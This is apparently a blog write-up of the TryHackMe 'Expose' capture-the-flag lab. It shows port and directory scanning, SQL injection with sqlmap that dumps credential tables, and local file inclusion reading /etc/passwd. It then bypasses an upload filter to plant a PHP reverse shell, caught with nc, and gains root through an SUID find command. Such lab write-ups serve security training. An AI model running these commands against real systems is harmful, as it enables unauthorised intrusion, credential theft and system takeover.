---
title: "TryHackMe - Expose"
author: Nasrallah
description: ""
date: 2024-12-09 07:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, sqlmap, sqli, suid]
img_path: /assets/img/tryhackme/expose
image:
    path: expose.png
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---

[Expose](https://tryhackme.comr/r/expose/expose) from [TryHackMe](https://tryhackme.com/signup?referrer=603949780215185dfb191142) starts with a login page vulnerable to sqli revealing secret pages where we can upload file. We bypass a local filter and upload a php reverse shell, once on the box we find an suid bit that exploit to get root.s

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.148.212
Host is up (0.090s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.14.91.207
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:e5:50:25:23:e6:ff:64:0c:76:45:8a:e5:3c:89:0a (RSA)
|   256 52:ef:6d:19:15:62:9b:2b:87:2f:0f:5e:8d:fc:38:d1 (ECDSA)
|_  256 17:84:ca:e2:94:f6:d9:bc:11:49:d3:64:10:80:d2:34 (ED25519)
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: EXPOSED
|_http-server-header: Apache/2.4.41 (Ubuntu)
1883/tcp open  mqtt
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found five open ports, 21 FTP, 22 SSH, 53 DNS 1337 Apache web server and 1883 probably mosquitto.

### FTP

We saw from nmap that the FTP server allows anonymous login but after authenticating we see nothing interesting.

### Web

Let's check the web server on port 1337.

We got the header `EXPOSED`, not sure what that means. Nothing can be found on the source code so let's run a directory scan.

```terminal
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.108.192:1337
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.4
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        7l        8w       91c http://10.10.108.192:1337/
301      GET        9l       28w      321c http://10.10.108.192:1337/admin => http://10.10.108.192:1337/admin/
301      GET        9l       28w      325c http://10.10.108.192:1337/admin_101 => http://10.10.108.192:1337/admin_101/
301      GET        9l       28w      326c http://10.10.108.192:1337/javascript => http://10.10.108.192:1337/javascript/
301      GET        9l       28w      326c http://10.10.108.192:1337/phpmyadmin => http://10.10.108.192:1337/phpmyadmin/
```

We found two interesting directories `admin` and `admin_101`.

Let's check the first one.

![admi](1.png)

It's a login portal, Trying to submit some credentials doesn't even send any request to the server. If we check the source code we can see why.

The `admin_101` is the same login page but contains the email `hacker@root.thm`. Trying to login on this page give us an error.

Checking the request on burp we find the following:

![burp](2.png)

We see a SQL query used by the website, adding a single quote `'` to the email produces and error.

![sqli](3.png)

This means there is a sql injection vulnerability.

Let's copy the request from burp to a file and give it to `sqlmap`.

```bash
sqlmap -r expose.req --batch --dbs
```

The command above performs the sql injection and retrieves the databases names.

```terminal
$ sqlmap -r file.req --batch --dbs                                                                                                                                                    
        ___                                                                                                                                                                                   
       __H__                                                                                                                                                                                  
 ___ ___[.]_____ ___ ___  {1.8.3#stable}                                                                                                                                                      
|_ -| . [(]     | .'| . |                                                                                                                                                                     
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                     
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                  
                                                                                               
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws.
 Developers assume no liability and are not responsible for any misuse or damage caused by this program                                                                                       
                                                                                                                                                                                              
[*] starting @ 17:49:42 /2024-11-19/                                                           
                                                                                                                                                                                              
[17:49:42] [INFO] parsing HTTP request from 'file.req'                                                                                                                                        
[17:49:43] [INFO] testing connection to the target URL                                                                                                                                        
[17:49:43] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS                                                                                       
[17:49:43] [INFO] testing if the target URL content is stable                                                                                                                                 
[17:49:43] [INFO] target URL content is stable                                                                                                                                                
[17:49:43] [INFO] testing if POST parameter 'email' is dynamic
[...]
available databases [6]:                                                                                                                                                                      
[*] expose                                                                                                                                                                                    
[*] information_schema                                                                         
[*] mysql                                                                                      
[*] performance_schema                                                                                                                                                                        
[*] phpmyadmin                                                                                                                                                                                
[*] sys     
```

The database that looks interesting is expose so let's dump it.

```terminal
$ sqlmap -r file.req --batch -D expose --dump                                           
        ___                                                                                    
       __H__                       
 ___ ___[']_____ ___ ___  {1.8.3#stable} 
|_ -| . [.]     | .'| . |                                                                      
|___|_  [,]_|_|_|__,|  _|                
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws.
 Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:07:39 /2024-11-19/

[19:07:39] [INFO] parsing HTTP request from 'file.req'
[19:07:39] [INFO] resuming back-end DBMS 'mysql' 
[19:07:39] [INFO] testing connection to the target URL


Database: expose                                                                                                                                                                              
Table: config                                                                                  
[2 entries]
+----+------------------------------+-----------------------------------------------------+
| id | url                          | password                                            |
+----+------------------------------+-----------------------------------------------------+
| 1  | /file1010111/index.php       | 69c66901[REDACTED]5b8929 (REDACTED)       |
| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
+----+------------------------------+-----------------------------------------------------+


Database: expose
Table: user
[1 entry]
+----+-----------------+---------------------+--------------------------------------+
| id | email           | created             | password                             |
+----+-----------------+---------------------+--------------------------------------+
| 1  | hacker@root.thm | 2023-02-21 09:05:46 | Very[REDACTED]1231 |
+----+-----------------+---------------------+--------------------------------------+
```

We found two tables both having credentials.

Login in to the admin portal gives nothing.

The page `/upload-cv00101011/index.php` asks for a username that start with z, we don't have that yet, let's continue.

We have `file1010111/index.php` password so let's authenticate.

We got the message `Parameter Fuzzing is also important :) or Can you hide DOM elements?`. Checking the source code we get another a hint `Hint: Try file or view as GET parameters

?`

There is a file parameter, let's try reading the `/etc/passwd`

![passwd](4.png)

It worked, and we got the username that stats with z.

## **Foothold**

Let's go to the upload page now.

![up](5.png)

The upload only accepts images but the filter seems to be client side.

I uploaded an image and intercepted the request on burp. Then I used repeater to upload a [php reverse shell](https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php)

![shell](6.png)

The uploaded file goes to `/upload_thm_1001` directory.

Going there we indeed the files.

I setup a listener and clicked on the php reverse shell file.

```terminal
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.14.91.207] from (UNKNOWN) [10.10.108.192] 59678
SOCKET: Shell has connected! PID: 1718
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ip-10-10-108-192:/var/www/html/upload-cv00101011/upload_thm_1001$ export TERM=xterm
<pload-cv00101011/upload_thm_1001$ export TERM=xterm                       
www-data@ip-10-10-108-192:/var/www/html/upload-cv00101011/upload_thm_10
```

## **Privilege Escalation**

On the user's home directory we can find ssh credentials.

Running linpeas shows us that `find` has suid bit.

```bash
-rwsr-x--- 1 root zeamkish 313K Feb 18  2020 /usr/bin/find
```

A quick visit to [GTFOBins](https://gtfobins.github.io/gtfobins/find/#suid) show us the command we need to run to get root.

```bash
find . -exec /bin/bash -p \; -quit
```

```terminal
zeamkish@ip-10-10-108-192:~$ find . -exec /bin/bash -p \; -quit
bash-5.0# whoami
root
```

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

## References
